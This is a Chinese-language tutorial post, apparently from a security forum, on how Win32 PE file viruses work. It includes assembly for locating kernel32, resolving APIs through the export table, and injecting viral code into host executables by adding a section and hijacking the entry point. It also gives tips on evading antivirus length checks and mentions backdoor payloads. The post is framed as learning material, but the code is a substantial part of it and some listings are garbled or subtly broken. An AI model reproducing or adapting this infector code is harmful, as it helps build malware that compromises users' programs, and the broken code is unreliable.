

# 关于 PE 文件病毒的一点心得

> 原文：[`www.pediy.com/kssd/pediy08/pediy8-387.htm`](https://www.pediy.com/kssd/pediy08/pediy8-387.htm)

PE 文件病毒虽然因为传播不及蠕虫已经很少独立存在了,但是仍然有很多病毒把他的感染部分作为一个功能.而且学习 PE 文件病毒可以让我们对 PE 的格式更好的了解,而加壳程序的外壳部分也运用到了和 PE 文件病毒类似的技术,所以还是可以了解下的  
我也是刚学习这方面的东西,就把一点点心得写了下来.参考了罗云彬的<windows 环境下 32 位汇编语言程序设计>在下菜鸟一只,望高手指教~  
  
  
首先说说 PE 文件病毒的工作方式．一个 PE 文件病毒基本上有这几个功能：  
  
１）获取 kernel32.dll 的基地址  
２）通过所获得的 kernel32 的基地址通过 dll 的 PE 文件格式中的输出表获得以后要使用到的 API 的地址，并将他们存放在变量或是栈中，将来所调用的 API 直接通过 CALL 这些地址来实现．  
３）查找要感染的文件并获得他们的基地址（通过 CreateFile,CreateFileMapping,ViewOfMapFile 将文件打开，当然调用的是 getapi 所找到的地址。其他过程和一般的程序没什么区别，所以就不写在这里了）  
４）通过获得的文件的基地址来根据文件的 PE 文件格式来将病毒代码注入到该文件中，在这里有两种方法，一是通过给程序添加一个节（section)来将病毒注入，另一种是选取一个未用完的节（因为节在内存中是按１０００为单位对齐的）．  
   当然了，病毒不可能只是复制自己而什么都不做，不然的话就没有破坏性了．．．在代码里都会有一段用来做点坏事～～比如开个后门～～  
   好了，我们来具体看看这些有趣的东西～～～嘿嘿  
第一个部分，获取 K32 的基地址  

> ```
> 代码:
> 
> * * *
> 
> \_GetK32 proc 
>         local @dwReturn
>         pushad
>         mov   @dwReturn,0　　　　　　　;返回值，先设为 0（即 false）
>       &nbs?p; mov   edi,\_dwKernelRet　　　   ;这里的\_dwKernel32Ret　是\[esp\]，当程序通过 ret 指令结
>                                        ;束的时候,系统会通过调用 CreateProcess()函数来启动进 
>                                        ;程，这时的堆栈中所存放的值就是 Kernel32 所在的那部分
>                                        ;地址段中的一个地址。因此，如果我们在程序中的开头部
>                                        ;分取出\[esp\]的值，就能通过这个值定位 kernel32 的基地址
>         and   edi,0ffff0000h           ;因为 WINDOWS 是分页系统，4K 一页，所以这条语句就是将 
>                                        ;edi 指向该页的基地址
> @1:                                    ;由于分页系统中模块加载都是从每一页的页首开始，所以
>                                &n?bsp;       ;基地址总每页的页首地址
>         cmp word ptr \[edi\],'ZM'        ;这一段是判断是否到达 K32 的基地址
>         jnz @1
>         mov esi,edi
>         add esi,\[esi+003ch\]
>         cmp word ptr \[esi\],'EP'
>         mov @dwReturn,edi
>         jz @2                         ;确认找到的是 K32 的基地址，跳
>         sub edi,010000h               ;不是 K32 的基地址，则查看是不是在前一页              
>         cmp edi,070000000h            
>         jb @2                         ;如果小于 07000000 则不查找，因为 K32 不会在小于
>                                       ;070000000 前的页，在这里为了简单没有考虑出错情况，一 
>                                        ;般出错的话就直接结束吧
>         jmp @1
> @2:   &n?bsp; add esp,0ch
>         popad
>         mov eax,@dwReturn             ;将找到的 K32 的基地址给 EAX 返回
>         ret
> \_GetK32 endp
> 
> 第二部分，GetApi 部分
> \_GetApi proc                          ;输入 ESI（指向一个 API 名字）输出该 API 的地址
>         mov edx,esi                   ;先将该 API 名字的首地址备份个
> @1:     cmp byte ptr \[esi\],0          ;这一段是获取 API 名字的长度，因为以 0 作为字符串结束的
>                                       ;标记，所以比较 esi 所指地址的值是否为 0 来判断是否是字
>                                       ;符串的结束
>         jz @2                         ;是，跳
>   inc esi                       ;不是则让 ESI 指向下一个字符，继续判断
>   jmp @1
> 
> * * *
> 
> 
> ```
> 
>     

  
@2 的目的就是获取，输出地址表 eat,存放输出的 API 的名字的数组 ent 和输出序数表 eot 的 VA。之所以要取这 3 个是因为 eat\[x\]的所对应的 API 并不就是 ent\[x\]对应的 API.实际上他们 3 者的 API 对应关系是 ent\[x\]'API=eat\[eot\[x\]\]'API  

> ```
> 代码:
> 
> * * *
> 
> @2:     inc esi                       
>         sub esi,edx                   ;esi-edx 就是 API 的字符串长度了
>   mov ecx,esi
>   xor eax,eax
>         mov count,ax                  ;COUNT 存放所输入的 API 在 ENT 的数组序号（即对应关系中的;X）
>   mov esi,hDllKernel32          
>   add esi,3ch                   ;即让 ESI 指向 NT 头，3c 是 dos 头的长度
>   mov esi,\[esi+78h\]             ;让 ESI 指向 DATA DIRECTORY 数组的首地址（这个值是 RVA）
>                                       ;由于输出表是放在数组的第一个，所以所指的这个数组的
>                                       ;首地址的 RVA 就是输出表的首地址的 RVA
>   add esi,hDllKernel32          ;输出表的 VA
>   add esi,1ch                   ;ESI 指向 AddressOfFunctions
>         lodsd                &nb?sp;        ;读取 AddressOfFunctions 的内容          
>   add eax,hDllKernel32          ;EAT(输出地址表）的 VA
>   mov eatVA,eax
>   lodsd                         ;读取 AddressOfNames 的内容
>   add eax,hDllKernel32          ;ENT（存放输出的 API 的名字的数组）
>   mov entVA,eax                 
>   lodsd                         ;读取输出序数表 EOT 的 RVA
>   add eax,hDllKernel32          ;VA
>   mov OrdinalVA,eax
>   mov esi,entVA
> 
> * * *
> 
> 
> ```
> 
>     

  
而@3 就是先比较所要得到地址的 API 名和 ENT 中的各名字对比找到 EAT，ENT，EOT 对应关系中的 X，然后得到该 API 的地址  

> ```
> 代码:
> 
> * * *
> 
> @3:     push esi                      
>         lodsd
>         add eax,hDllKernel32  ;数组指针
>   mov esi,eax
>   mov edi,edx
>   push ecx              ;该 API 名字的长度
>   cld
>   rep cmpsb             ;比较这时数组指针所指的 API 名是否是输入的那个 API 名
>   pop ecx
>   jz @4         &nbs?p;       ;是，跳
>   pop esi
>   add esi,4             ;不是，指向下一个数组中的 API 名字继续比较
>   inc Count  
>   jmp @3
> @4:     pop esi
>         mov eax,Count         ;进行对应关系的转换
>   shl eax,1
>   add eax,OrdinalVA    ;EAX 中地址存放的就是 EOT\[X\]
>   xor esi,esi
>         xchg eax,esi
>         lodsw
>   shl eax,2
>   add eax,eatVA       
>   mov esi，eax
>   lodsd                ;读取 eat\[eot\[x\]\]的内容（API 的 RVA 地址）
>   add eax,hDllKernel32 ；VA
>   ret
> ;>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
> \_GetApis proc               ;输入的是 ESI（指向存放 API 名字的数组）和 EDI（指向存放
>                             ;API 函数所在地址的数组）
> @1:      push esi
>    push edi
>    call \_GetApi
>    pop edi
>    pop esi
>    stosd
> @2:      cmp byte ptr \[esi\],0    ；判断是否是一个 API 名的结束
>       &n?bsp;  jz @3
>    inc esi
>    jmp @2
> @3:      cmp word ptr \[esi\],0bbh ；判断是否是数组的结束
>          jz @4                   ;是，则结束
>    inc esi                 ；不是，指向下一个 API 名，继续查找他的地址
>    jmp @1
> @4:      ret
> \_GetApis endp
> ;>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
> 
> * * *
> 
> 
> ```
> 
>     

  
第三部分：感染~~  
如之前所讲的，感染有两种方式，在这里我们采用了第一种方式。这个函数的工作方式是这样的：  
1）将代码添加到一个新节中，我们先将一个指针指向文件中的最后的一个节的结尾，从这里把我们的代码写到后面。另一个指针指向到最后的那个节对应的 section header 修改 PointerToRawData 和 SizeOfRawData 让它指向的是我们添加的那个节。  
2）记录下未感染的 OEP，因为在我们的代码结束的时候要让宿主程序正常执行（除非你想让人家知道自己被感染了。。。）所以我们要先记录他的 OEP，在我们程序结束的时候运用一个 JMP 跳过去。  
3）修改 nt 头中的 AddressOfEntryPoint，让它指向的是我们的添加的代码  
  

> ```
> 代码:
> 
> * * *
> 
> \_Inject proc                               ;lpFile 是文件的基地址，lpPEHead 是 nt 头
>         mov esi,\_lpPEHead
>   mov edi,\_lpPEHead
>   movzx eax,\[esi+06h\]                ;NumberOfSections
>   dec eax
>   mov ecx,28h         &n?bsp;              ;28h 为一个 section header 的长度                        
>   mul ecx                            ;eax 中为所有 section header 部分的长度
>   add esi,eax
>   add esi,78h                        ;减去 data\_directory 的 nt header 长度
>   mov edx,\[edi+74h\]
>   shl edx,3                          ;edx 存放计算出的 data\_directory 长度
>   add esi,edx                        ;esi 指向了最后一个 section header
>   mov \_Oldep,\[edi+28h\]               ;存下 AddressOfEntryPoint
>   mov \_ImageBase,\[edi+34h\]      
>   mov \_SizeOfRawData,\[esi+10h\]
>   mov \_PointerToRawData,\[esi+14h\]
>   mov edx,\_PointerToRawData
>   add edx,\_SizeOfRawData
>   mov \_AllSecHeadLength,edx           
>   mov eax,\_SizeOfRawData
>   add eax,\[esi+0ch\]                   ;+VA,则在 eax 所指的地址添加病毒代码，且此时的 EAX 为 new                     &?nbsp;        
>         mov \_Newep,eax
>   mov \[edi+28h\],eax                   ;将旧的 ep 覆盖为新的
>         mov eax,\[esi+10h\]                   ;
>   invoke \_Align,\_dwVirusSize,\[esi+3ch\] ;将我们的节对齐
>   mov \[esi+08h\],eax                   ;更新对齐后的 SIZEOFRAWDATA 和 VIRTUALSIZE
>   mov \[esi+10h\],eax
>         add eax,\[esi+0ch\]                    ;eax=size of image(加上了新加的节的长度）
>   mov \[edi+50h\],eax
>   or  dword ptr \[esi+24h\],0a0000020h   ；该节属性定为可执行代码
>   mov dword ptr \[edi+4ah\],"Zalone"     ；节的名字 enolaZ~~~~~~
>   lea esi,\[ebp+virus\_start\]            ;把我们的代码移进去
>   mov edx,\_AllSecHeadLength
>   xchg edi,edx
>   add edi,\_lpFile
>   mov ecx,virus\_size
>   repnz movsb                          ；写代码的循环
>   jmp UnMapFile                        ;完成，关闭这个文件
>         ret
> InjectFile endp
> 
> * * *
> 
> 
> ```
> 
>     

  
好了，关键的部分就是这个样子，主?体部分我觉得其实是最简单的，所以没贴出来.感觉代码还不是很优化，另外这个东西也没有一些反调试或是隐藏自己的方法.另外在对 eot,ent,eat 那部分感觉的讲解还不是很清晰，不过那个表达式是很清晰的说明了,可能是好久没写过作文了吧... 

关于将代码添加到节里的方法是可以突破对齐的限制的.我们只需要将代码分段注入到其它的几个节里就行了.所以只要 文件的对齐长度-实际长度>病毒长度就可以了,另外好象有的病毒还可以将代码注入到几个系统文件中,比如"莫国防"病毒(win32.mgf)就是把自己的前 3kb 放到了 kernel32.dll 的节空隙,后 2kb 放到了 user32.dll 的节空隙中  
另外关于把节添加到代码空隙中的好处是可以避免杀毒程序的一种叫长度检查的杀毒方法.因为这样添加的病毒代码不会改变文件的长度.  
当然在这里为了简单我们是直接添加的一个节  
  C 码是说的 C 写的代码吗?C 不能够实现代码自身的首地址的定向而汇编可以通过在代码开头  
call @f  
@@:  
pop ebx  
sub ebx,offset @b  
来实现自身的重定位  
  
关于节的段是属性的问题,我们是通过  
or  dword ptr \[esi+24h\],0a0000020h   ；该节属性定为可执行代码(esi 指向的是 SECTION\_HEADER)  
在保持原先的属性不变的情况下,加上可执行的属性.这样我们的代码就能够运行了,而又不会影响宿主程序本身的执行    
加壳程序也是通过类似的方式将外壳代码放到要加壳的程序里的,不过,为了 ANTI-DEBUGGER 在跳回 OEP 之前做了许多保护措施和陷阱